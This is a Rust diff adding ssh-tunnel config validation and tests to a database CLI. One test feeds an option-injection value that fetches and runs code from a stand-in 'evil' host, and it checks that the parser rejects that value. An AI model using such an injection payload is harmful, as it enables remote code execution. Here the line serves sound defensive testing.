@@ -51,8 +51,6 @@ pub struct Validator {
     pub deny_functions: Option<Vec<String>>,
 }
 
-// Accepted now; used in step 5 (ssh tunnels).
-#[allow(dead_code)]
 #[derive(Debug, Deserialize)]
 #[serde(deny_unknown_fields)]
 pub struct Ssh {
@@ -78,6 +76,16 @@ pub enum ConfigError {
     /// `row_limit = 0` / `timeout_secs = 0`: zero would mean "no rows" /
     /// "every query times out" — never what anyone wants. Fail loud.
     ZeroValue { key: String },
+    /// A `[connections.X.ssh]` section is present but `host` or `remote` is
+    /// missing/empty — both are required to open a tunnel. `field` is the name.
+    SshMissingField { alias: String, field: &'static str },
+    /// An ssh tunnel was configured for a sqlite connection. SQLite is a local
+    /// file; a port forward is meaningless (and would silently do nothing).
+    SshWithSqlite { alias: String },
+    /// An ssh `host`/`remote`/`control_persist` value is malformed or unsafe
+    /// (e.g. an option-injection host after `${VAR}` substitution). Caught at
+    /// parse (fail-fast) rather than as a runtime tunnel error.
+    SshInvalid { alias: String, message: String },
 }
 
 /// Environment lookup, injected for purity (cli passes `std::env::var`).
@@ -115,6 +123,7 @@ pub fn parse(text: &str, env: EnvLookup) -> Result<Config, ConfigError> {
             conn.timeout_secs,
             &format!("connections.{alias}.timeout_secs"),
         )?;
+        validate_ssh(alias, conn)?;
     }
     Ok(config)
 }
@@ -133,6 +142,46 @@ pub fn peek_defaults_format(text: &str) -> Option<String> {
         .get("format")?
         .as_str()
         .map(str::to_string)
+}
+
+/// When a `[ssh]` section is present, `host` and `remote` are required (they
+/// are `Option` only so the section can be parsed before this check), and the
+/// engine must not be sqlite (a tunnel is meaningless for a local file).
+fn validate_ssh(alias: &str, conn: &Connection) -> Result<(), ConfigError> {
+    let Some(ssh) = &conn.ssh else {
+        return Ok(());
+    };
+    let present = |v: &Option<String>| v.as_deref().is_some_and(|s| !s.trim().is_empty());
+    if !present(&ssh.host) {
+        return Err(ConfigError::SshMissingField {
+            alias: alias.to_string(),
+            field: "host",
+        });
+    }
+    if !present(&ssh.remote) {
+        return Err(ConfigError::SshMissingField {
+            alias: alias.to_string(),
+            field: "remote",
+        });
+    }
+    if conn.engine == "sqlite" {
+        return Err(ConfigError::SshWithSqlite {
+            alias: alias.to_string(),
+        });
+    }
+    // Strict format/safety validation, fail-fast (exit 3). Critically this
+    // rejects an option-injection host (e.g. a `${VAR}` that expanded to
+    // `-oProxyCommand=...`) before it can ever reach the ssh argv.
+    let invalid = |message: String| ConfigError::SshInvalid {
+        alias: alias.to_string(),
+        message,
+    };
+    crate::tunnel::validate_host(ssh.host.as_deref().unwrap_or_default()).map_err(invalid)?;
+    crate::tunnel::validate_remote(ssh.remote.as_deref().unwrap_or_default()).map_err(invalid)?;
+    if let Some(cp) = &ssh.control_persist {
+        crate::tunnel::validate_control_persist(cp).map_err(invalid)?;
+    }
+    Ok(())
 }
 
 /// Zero limits are footguns: row_limit = 0 returns nothing (looking like an
@@ -564,6 +613,95 @@ mod tests {
         }
         // 1 is fine.
         assert!(parse("[defaults]\nrow_limit = 1", &env_of(&[])).is_ok());
+    }
+
+    #[test]
+    fn ssh_section_requires_host_and_remote() {
+        // Missing host.
+        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
+                    [connections.a.ssh]\nremote = \"db:5432\"";
+        match parse(text, &env_of(&[])).unwrap_err() {
+            ConfigError::SshMissingField { alias, field } => {
+                assert_eq!(alias, "a");
+                assert_eq!(field, "host");
+            }
+            other => panic!("expected SshMissingField host, got {other:?}"),
+        }
+        // Present-but-empty host is also missing.
+        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
+                    [connections.a.ssh]\nhost = \"  \"\nremote = \"db:5432\"";
+        assert!(matches!(
+            parse(text, &env_of(&[])).unwrap_err(),
+            ConfigError::SshMissingField { field: "host", .. }
+        ));
+        // Missing remote.
+        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
+                    [connections.a.ssh]\nhost = \"deploy@bastion:22\"";
+        assert!(matches!(
+            parse(text, &env_of(&[])).unwrap_err(),
+            ConfigError::SshMissingField {
+                field: "remote",
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn ssh_option_injection_host_is_rejected_at_parse() {
+        // RCE guard: a ${VAR} that expands to an ssh option must fail at config
+        // parse (exit 3), before the value can reach the ssh argv.
+        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
+                    [connections.a.ssh]\nhost = \"${BASTION}\"\nremote = \"db:5432\"";
+        match parse(
+            text,
+            &env_of(&[("BASTION", "-oProxyCommand=sh -c \"curl evil|sh\"")]),
+        )
+        .unwrap_err()
+        {
+            ConfigError::SshInvalid { alias, .. } => assert_eq!(alias, "a"),
+            other => panic!("expected SshInvalid, got {other:?}"),
+        }
+        // A malformed remote and a bad control_persist are also parse errors.
+        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
+                    [connections.a.ssh]\nhost = \"bastion:22\"\nremote = \"db:notaport\"";
+        assert!(matches!(
+            parse(text, &env_of(&[])).unwrap_err(),
+            ConfigError::SshInvalid { .. }
+        ));
+        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
+                    [connections.a.ssh]\nhost = \"bastion:22\"\nremote = \"db:5432\"\n\
+                    control_persist = \"fifteen\"";
+        assert!(matches!(
+            parse(text, &env_of(&[])).unwrap_err(),
+            ConfigError::SshInvalid { .. }
+        ));
+        // Port 0 (host and remote) is rejected at parse (ssh refuses it).
+        for ssh in [
+            "host = \"bastion:0\"\nremote = \"db:5432\"",
+            "host = \"bastion:22\"\nremote = \"db:0\"",
+        ] {
+            let text = format!(
+                "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
+                 [connections.a.ssh]\n{ssh}"
+            );
+            assert!(
+                matches!(
+                    parse(&text, &env_of(&[])).unwrap_err(),
+                    ConfigError::SshInvalid { .. }
+                ),
+                "port 0 must be rejected: {ssh}"
+            );
+        }
+    }
+
+    #[test]
+    fn ssh_is_rejected_for_sqlite() {
+        let text = "[connections.a]\nengine = \"sqlite\"\npath = \"./x.db\"\n\
+                    [connections.a.ssh]\nhost = \"deploy@bastion:22\"\nremote = \"db:5432\"";
+        match parse(text, &env_of(&[])).unwrap_err() {
+            ConfigError::SshWithSqlite { alias } => assert_eq!(alias, "a"),
+            other => panic!("expected SshWithSqlite, got {other:?}"),
+        }
     }
 
     #[test]
